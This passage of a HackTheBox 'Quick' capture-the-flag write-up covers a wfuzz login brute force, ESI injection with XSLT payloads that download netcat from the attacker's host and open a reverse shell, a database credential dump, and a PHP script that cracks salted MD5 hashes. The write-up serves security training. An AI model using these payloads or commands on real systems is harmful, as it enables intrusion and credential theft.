  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"column"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/w3images/team2.jpg"</span> <span class="na">alt=</span><span class="s">"Mike"</span> <span class="na">style=</span><span class="s">"width:100%"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;h2&gt;</span>Mike Ross<span class="nt">&lt;/h2&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span>Sales Manager<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;p&gt;</span>Manages the sales and services.<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;p&gt;</span>mike@quick.htb<span class="nt">&lt;/p&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"column"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"card"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/w3images/team3.jpg"</span> <span class="na">alt=</span><span class="s">"John"</span> <span class="na">style=</span><span class="s">"width:100%"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;h2&gt;</span>John Doe<span class="nt">&lt;/h2&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span>Web Designer<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;p&gt;</span>Front end developer.<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;p&gt;</span>john@quick.htb<span class="nt">&lt;/p&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>docs</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>

<span class="nt">&lt;h1&gt;</span>Quick | References<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"docs/QuickStart.pdf"</span><span class="nt">&gt;</span>Quick-Start Guide<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"docs/Connectivity.pdf"</span><span class="nt">&gt;</span>Connectivity Guide<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Look’s Like we got something let’s grab these PDF’s</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>cargo run <span class="nt">--manifest-path</span><span class="o">=</span>tools/apps/Cargo.toml <span class="nt">--bin</span> quiche-client <span class="nt">--</span> <span class="nt">--no-verify</span>  https:/quick.htb/docs/Connectivity.pdf <span class="o">&gt;&gt;</span> quick.pdf

cargo run <span class="nt">--manifest-path</span><span class="o">=</span>tools/apps/Cargo.toml <span class="nt">--bin</span> quiche-client <span class="nt">--</span> <span class="nt">--no-verify</span>  https:/quick.htb/docs/QuickStart.pdf <span class="o">&gt;&gt;</span> quick2.pdf
</pre></table></code></div></div><p>And After going through PDF’s we can find password</p><p><img src="/assets/img/post/hackthebox/quick/3.png" alt="Quick" /></p><h3 id="method-2">Method 2:~$</h3><p>Fetch Docker Image and Login into <code class="highlighter-rouge">Docker</code> as <code class="highlighter-rouge">root</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>docker run <span class="nt">--net</span> host <span class="nt">--privileged</span> <span class="nt">-it</span> <span class="nt">--rm</span> ymuski/curl-http3 /bin/bash
</pre></table></code></div></div><p>Run the below steps to Get the above files</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>curl <span class="nt">--http3</span> https://portal.quick.htb/

curl <span class="nt">--http3</span> https://portal.quick.htb/index.php?view<span class="o">=</span>contact

curl <span class="nt">--http3</span> https://portal.quick.htb/index.php?view<span class="o">=</span>about

curl <span class="nt">--http3</span> https://portal.quick.htb/index.php?view<span class="o">=</span>docs

curl <span class="nt">--http3</span> https://portal.quick.htb/docs/Connectivity.pdf <span class="nt">-o</span> quick.pdf

curl <span class="nt">--http3</span> https://portal.quick.htb/docs/QuickStart.pdf <span class="nt">-o</span> quick2.pdf
</pre></table></code></div></div><h1 id="enumeration">Enumeration:~$</h1><p>We have a password: <code class="highlighter-rouge">Quick4cc3$$</code></p><p>If we can have email id also we can login to port 9001</p><p>You remember we got potential users on Port 9001</p><p><img src="/assets/img/post/hackthebox/quick/4.png" alt="Quick" /></p><p>Also We got their Comapnies and their countries</p><p><img src="/assets/img/post/hackthebox/quick/5.png" alt="Quick" /></p><p>Make a list of all possible emails keeping in mind they are corporations</p><p>You can try manually one bye one or just use wfuzz to bruteforce the login</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre> ~/htb/boxes/Quick/webwuic <span class="o">&gt;&gt;</span> wfuzz <span class="nt">-w</span> user.lst <span class="nt">-X</span> POST <span class="nt">-u</span> <span class="s1">'http://quick.htb:9001/login.php'</span> <span class="nt">-d</span> <span class="s1">'email=FUZZ&amp;password=Quick4cc3$$'</span> <span class="nt">--hc</span> 200 <span class="nt">-c</span>

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://quick.htb:9001/login.php
Total requests: 19

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                              
===================================================================

000000013:   302        0 L      0 W      0 Ch        "elisa@wink.co.uk"                                                                                   

Total time: 1.544700
Processed Requests: 19
Filtered Requests: 18
Requests/sec.: 12.30011
</span></pre></table></code></div></div><p>Hurray We got email and password Now we can login to quick.htb:9001/login.php</p><p><code class="highlighter-rouge">elisa@wink.co.uk:Quick4cc3$$</code></p><p><img src="/assets/img/post/hackthebox/quick/6.png" alt="Quick" /></p><h1 id="initial-foothold">Initial Foothold:~$</h1><p>After taking a quick look around we can see that we have a functionality to raise a ticket and search for our ticket nothing more</p><p><img src="/assets/img/post/hackthebox/quick/7.png" alt="Quick" /> <img src="/assets/img/post/hackthebox/quick/8.png" alt="Quick" /></p><p>Let’s check for Headers</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
X-Powered-By: Esigate
Content-Length: 6214
</pre></table></code></div></div><p>We get an interesting Header <code class="highlighter-rouge">X-Powered-By: Esigate</code></p><p>Therefore we can you ESI Injection. You can find an amazing article on it <a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/">Here</a></p><h2 id="rce-thorugh-xslt">RCE thorugh XSLT:~$</h2><blockquote> <esi:include src="http://website.com/data/news.xml" stylesheet="/news_template.xsl"></esi:include></blockquote><p>Therefore we can inject xsl file using ticket functionaltiy</p><p>Let’s create 3 different xsl files</p><ol><li>For downloading nc on machine</li><li>Changing Permissions of nc</li><li>Triggering Reverse Shell</li></ol><p>Launch a Python server on your machine where the files are located</p><p>Payload of all the files</p><p>Wget</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> ?&gt;
&lt;xsl:stylesheet <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> xmlns:xsl<span class="o">=</span><span class="s2">"http://www.w3.org/1999/XSL/Transform"</span><span class="o">&gt;</span>
&lt;xsl:output <span class="nv">method</span><span class="o">=</span><span class="s2">"xml"</span> omit-xml-declaration<span class="o">=</span><span class="s2">"yes"</span>/&gt;
&lt;xsl:template <span class="nv">match</span><span class="o">=</span><span class="s2">"/"</span>
xmlns:xsl<span class="o">=</span><span class="s2">"http://www.w3.org/1999/XSL/Transform"</span>
xmlns:rt<span class="o">=</span><span class="s2">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span><span class="o">&gt;</span>
&lt;root&gt;
&lt;xsl:variable <span class="nv">name</span><span class="o">=</span><span class="s2">"cmd"</span><span class="o">&gt;</span>&lt;<span class="o">![</span>CDATA[wget http://10.10.14.166:8000/nc <span class="nt">-O</span> vnc]]&gt;&lt;/xsl:variable&gt;
&lt;xsl:variable <span class="nv">name</span><span class="o">=</span><span class="s2">"rtObj"</span> <span class="k">select</span><span class="o">=</span><span class="s2">"rt:getRuntime()"</span>/&gt;
&lt;xsl:variable <span class="nv">name</span><span class="o">=</span><span class="s2">"process"</span> <span class="k">select</span><span class="o">=</span><span class="s2">"rt:exec(</span><span class="nv">$rtObj</span><span class="s2">, </span><span class="nv">$cmd</span><span class="s2">)"</span>/&gt;
Process: &lt;xsl:value-of <span class="k">select</span><span class="o">=</span><span class="s2">"</span><span class="nv">$process</span><span class="s2">"</span>/&gt;
Command: &lt;xsl:value-of <span class="k">select</span><span class="o">=</span><span class="s2">"</span><span class="nv">$cmd</span><span class="s2">"</span>/&gt;
&lt;/root&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre></table></code></div></div><p>chmod</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> ?&gt;
&lt;xsl:stylesheet <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> xmlns:xsl<span class="o">=</span><span class="s2">"http://www.w3.org/1999/XSL/Transform"</span><span class="o">&gt;</span>
&lt;xsl:output <span class="nv">method</span><span class="o">=</span><span class="s2">"xml"</span> omit-xml-declaration<span class="o">=</span><span class="s2">"yes"</span>/&gt;
&lt;xsl:template <span class="nv">match</span><span class="o">=</span><span class="s2">"/"</span>
xmlns:xsl<span class="o">=</span><span class="s2">"http://www.w3.org/1999/XSL/Transform"</span>
xmlns:rt<span class="o">=</span><span class="s2">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span><span class="o">&gt;</span>
&lt;root&gt;
&lt;xsl:variable <span class="nv">name</span><span class="o">=</span><span class="s2">"cmd"</span><span class="o">&gt;</span>&lt;<span class="o">![</span>CDATA[chmod 777 vnc]]&gt;&lt;/xsl:variable&gt;
&lt;xsl:variable <span class="nv">name</span><span class="o">=</span><span class="s2">"rtObj"</span> <span class="k">select</span><span class="o">=</span><span class="s2">"rt:getRuntime()"</span>/&gt;
&lt;xsl:variable <span class="nv">name</span><span class="o">=</span><span class="s2">"process"</span> <span class="k">select</span><span class="o">=</span><span class="s2">"rt:exec(</span><span class="nv">$rtObj</span><span class="s2">, </span><span class="nv">$cmd</span><span class="s2">)"</span>/&gt;
Process: &lt;xsl:value-of <span class="k">select</span><span class="o">=</span><span class="s2">"</span><span class="nv">$process</span><span class="s2">"</span>/&gt;
Command: &lt;xsl:value-of <span class="k">select</span><span class="o">=</span><span class="s2">"</span><span class="nv">$cmd</span><span class="s2">"</span>/&gt;
&lt;/root&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre></table></code></div></div><p>shell</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> ?&gt;
&lt;xsl:stylesheet <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> xmlns:xsl<span class="o">=</span><span class="s2">"http://www.w3.org/1999/XSL/Transform"</span><span class="o">&gt;</span>
&lt;xsl:output <span class="nv">method</span><span class="o">=</span><span class="s2">"xml"</span> omit-xml-declaration<span class="o">=</span><span class="s2">"yes"</span>/&gt;
&lt;xsl:template <span class="nv">match</span><span class="o">=</span><span class="s2">"/"</span>
xmlns:xsl<span class="o">=</span><span class="s2">"http://www.w3.org/1999/XSL/Transform"</span>
xmlns:rt<span class="o">=</span><span class="s2">"http://xml.apache.org/xalan/java/java.lang.Runtime"</span><span class="o">&gt;</span>
&lt;root&gt;
&lt;xsl:variable <span class="nv">name</span><span class="o">=</span><span class="s2">"cmd"</span><span class="o">&gt;</span>&lt;<span class="o">![</span>CDATA[./vnc <span class="nt">-e</span> /bin/sh 10.10.14.166 9001 <span class="o">]]&gt;</span>&lt;/xsl:variable&gt;
&lt;xsl:variable <span class="nv">name</span><span class="o">=</span><span class="s2">"rtObj"</span> <span class="k">select</span><span class="o">=</span><span class="s2">"rt:getRuntime()"</span>/&gt;
&lt;xsl:variable <span class="nv">name</span><span class="o">=</span><span class="s2">"process"</span> <span class="k">select</span><span class="o">=</span><span class="s2">"rt:exec(</span><span class="nv">$rtObj</span><span class="s2">, </span><span class="nv">$cmd</span><span class="s2">)"</span>/&gt;
Process: &lt;xsl:value-of <span class="k">select</span><span class="o">=</span><span class="s2">"</span><span class="nv">$process</span><span class="s2">"</span>/&gt;
Command: &lt;xsl:value-of <span class="k">select</span><span class="o">=</span><span class="s2">"</span><span class="nv">$cmd</span><span class="s2">"</span>/&gt;
&lt;/root&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre></table></code></div></div><p>You can use 3 blank xml file</p><p>So our Final Payload will be</p><blockquote> <esi:include src="http://10.10.14.166:8000/wget2.xml" stylesheet="http://10.10.14.166:8000/wget2.xsl"></esi:include> <esi:include src="http://10.10.14.166:8000/chod.xml" stylesheet="http://10.10.14.166:8000/chod.xsl"></esi:include> <esi:include src="http://10.10.14.166:8000/shell2.xml" stylesheet="http://10.10.14.166:8000/shell2.xsl"></esi:include></blockquote><p><img src="/assets/img/post/hackthebox/quick/9.png" alt="Quick" /> <img src="/assets/img/post/hackthebox/quick/10.png" alt="Quick" /> <img src="/assets/img/post/hackthebox/quick/11.png" alt="Quick" /></p><p>Inject all the 3 Payloads and search for their ticket number to trigger them</p><p>Final Payload</p><p><img src="/assets/img/post/hackthebox/quick/12.png" alt="Quick" /></p><p>Python Server It shows our injection is Successfull</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> ~/htb/boxes/Quick/xsl <span class="o">&gt;&gt;</span> python <span class="nt">-m</span> SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.186 - - <span class="o">[</span>25/May/2020 09:52:56] <span class="s2">"GET /wget2.xsl HTTP/1.1"</span> 200 -
10.10.10.186 - - <span class="o">[</span>25/May/2020 09:52:57] <span class="s2">"GET /wget2.xml HTTP/1.1"</span> 200 -
10.10.10.186 - - <span class="o">[</span>25/May/2020 09:52:58] <span class="s2">"GET /nc HTTP/1.1"</span> 200 -
10.10.10.186 - - <span class="o">[</span>25/May/2020 09:55:32] <span class="s2">"GET /chod.xsl HTTP/1.1"</span> 200 -
10.10.10.186 - - <span class="o">[</span>25/May/2020 09:55:33] <span class="s2">"GET /chod.xml HTTP/1.1"</span> 200 -
10.10.10.186 - - <span class="o">[</span>25/May/2020 09:56:00] <span class="s2">"GET /shell2.xsl HTTP/1.1"</span> 200 -
10.10.10.186 - - <span class="o">[</span>25/May/2020 09:56:01] <span class="s2">"GET /shell2.xml HTTP/1.1"</span> 200 -
</pre></table></code></div></div><p>And we get shell <code class="highlighter-rouge">sam</code> on listner</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> ~/htb/boxes/Quick <span class="o">&gt;&gt;</span> nc <span class="nt">-nvlp</span> 9001
listening on <span class="o">[</span>any] 9001 ...
connect to <span class="o">[</span>10.10.14.166] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.186] 40126
python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span> 
sam@quick:~<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>sam<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>sam<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>sam<span class="o">)</span>
sam@quick:~<span class="nv">$ </span><span class="nb">wc</span> <span class="nt">-c</span> user.txt
<span class="nb">wc</span> <span class="nt">-c</span> user.txt
33 user.txt
sam@quick:~<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="enumeration-1">Enumeration:~$</h1><h2 id="sam---srvadm">sam -&gt; srvadm</h2><p>After doing some Enumeration I found <code class="highlighter-rouge">Database</code> Creds in /var/www/html</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>sam@quick:/var/www/html<span class="nv">$ </span><span class="nb">cat </span>db.php
<span class="nb">cat </span>db.php
&lt;?php
<span class="nv">$conn</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="s2">"localhost"</span>,<span class="s2">"db_adm"</span>,<span class="s2">"db_p4ss"</span>,<span class="s2">"quick"</span><span class="o">)</span><span class="p">;</span>
?&gt;
sam@quick:/var/www/html<span class="err">$</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre>sam@quick:/var/www/html<span class="nv">$ </span>mysql <span class="nt">-u</span> db_adm <span class="nt">-p</span>
mysql <span class="nt">-u</span> db_adm <span class="nt">-p</span>
Enter password: db_p4ss

Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 20
Server version: 5.7.29-0ubuntu0.18.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

mysql&gt; show databases<span class="p">;</span>
show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| quick              |
| sys                |
+--------------------+
5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
mysql&gt; use quick<span class="p">;</span>
use quick<span class="p">;</span>
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Database changed
mysql&gt; show tables<span class="p">;</span>
show tables<span class="p">;</span>
+-----------------+
| Tables_in_quick |
+-----------------+
| <span class="nb">jobs</span>            |
| tickets         |
| <span class="nb">users</span>           |
+-----------------+
3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
<span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; 
</pre></table></code></div></div><p>We get a hash for <code class="highlighter-rouge">srvadm</code> seems to be md5 After wasting time to decrypt it When I saw login.php in ‘/var/www/html’ I founded some salting is being used in it to encrypt it</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nx">sam</span><span class="o">@</span><span class="nx">quick</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">login</span><span class="o">.</span><span class="nx">php</span>
<span class="nx">cat</span> <span class="nx">login</span><span class="o">.</span><span class="nx">php</span>
<span class="o">&lt;?</span><span class="nx">php</span> 
<span class="k">include</span><span class="p">(</span><span class="s2">"db.php"</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">]))</span>
<span class="p">{</span>
  <span class="nv">$email</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">];</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span><span class="s1">'fa'</span><span class="p">));</span>
<span class="p">[</span><span class="nx">REDACTED</span><span class="p">]</span>
</pre></table></code></div></div><p>So I wrote a short php script to dcode the hash implementing same logic</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"/usr/share/wordlists/rockyou.txt"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">while</span> <span class="p">((</span><span class="nv">$line</span> <span class="o">=</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$handle</span><span class="p">))</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> 
    <span class="p">{</span>
      <span class="nv">$pass</span><span class="o">=</span> <span class="s2">"e626d51f8fbfd1124fdea88396c35d05"</span><span class="p">;</span>
        <span class="nv">$Password</span><span class="o">=</span> <span class="nb">MD5</span><span class="p">(</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="s1">'fa'</span><span class="p">))</span>        
        <span class="k">if</span><span class="p">(</span><span class="nv">$pass</span><span class="o">==</span><span class="nv">$Password</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">"Hash Cracked Password is: "</span><span class="nv">$line</span><span class="p">;</span>
        <span class="p">}</span>  
    <span class="p">}</span>

    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
<span class="p">}</span> 
<span class="k">else</span> <span class="p">{</span>
    <span class="c1">// </span>
    <span class="k">echo</span> <span class="s2">"error opening the file."</span><span class="p">;</span>
<span class="p">}</span> 
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>On running the script we get the password <code class="highlighter-rouge">yl51pbx</code></p><p>Now while doing enumertaion we got a <code class="highlighter-rouge">printer</code> dir /var/www</p><p>Let’s check host file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>sam@quick:/etc/apache2/sites-enabled<span class="nv">$ </span><span class="nb">cat </span>000-default.conf
<span class="nb">cat </span>000-default.conf
&lt;VirtualHost <span class="k">*</span>:80&gt;
  <span class="c"># The ServerName directive sets the request scheme, hostname and port that</span>
  <span class="c"># the server uses to identify itself. This is used when creating</span>
  <span class="c"># redirection URLs. In the context of virtual hosts, the ServerName</span>
  <span class="c"># specifies what hostname must appear in the request's Host: header to</span>
  <span class="c"># match this virtual host. For the default virtual host (this file) this</span>
  <span class="c"># value is not decisive as it is used as a last resort host regardless.</span>
  <span class="c"># However, you must set it for any further virtual host explicitly.</span>
  <span class="c">#ServerName www.example.com</span>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  <span class="c"># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span>
  <span class="c"># error, crit, alert, emerg.</span>
  <span class="c"># It is also possible to configure the loglevel for particular</span>
  <span class="c"># modules, e.g.</span>
  <span class="c">#LogLevel info ssl:warn</span>

  ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
  CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined

  <span class="c"># For most configuration files from conf-available/, which are</span>
  <span class="c"># enabled or disabled at a global level, it is possible to</span>
  <span class="c"># include a line for only one particular virtual host. For example the</span>
  <span class="c"># following line enables the CGI configuration for this host only</span>
  <span class="c"># after it has been globally disabled with "a2disconf".</span>
  <span class="c">#Include conf-available/serve-cgi-bin.conf</span>
&lt;/VirtualHost&gt;
&lt;VirtualHost <span class="k">*</span>:80&gt;
  AssignUserId srvadm srvadm
  ServerName printerv2.quick.htb
  DocumentRoot /var/www/printer
&lt;/VirtualHost&gt;
<span class="c"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
sam@quick:/etc/apache2/sites-enabled<span class="nv">$ </span>
</pre></table></code></div></div><p>And the subdomain we got is printerv2.quick.htb . apache2 service running on port 80 and since there was no any remote port:80 opened.so the service is running locally.</p><p>I forwarded the port 80 to my localhost and added a entry of subdomain <code class="highlighter-rouge">printerv2.quick.htb</code> to my /etc/hosts file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">[</span>vibhu@parrot]─[~/HTB/boxes/ROOTED/Quick]<span class="nv">$ </span>ssh <span class="nt">-i</span> ~/.ssh/id_rsa <span class="nt">-L</span> 80:127.0.0.1:80 sam@quick.htb
</pre></table></code></div></div><p>And now i can access the localhost:80 and the subdomain too.</p><p>On connecting we get a login screen</p><p><img src="/assets/img/post/hackthebox/quick/13.png" alt="Quick" /></p><p>Login using <code class="highlighter-rouge">srvadm@quick.htb:yl51pbx</code></p><p><img src="/assets/img/post/hackthebox/quick/14.png" alt="Quick" /></p><p>This is a basic site with some add-printer functionality.</p><p>If we go back to our shell . We can see some files are there in <code class="highlighter-rouge">printers</code> dir.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
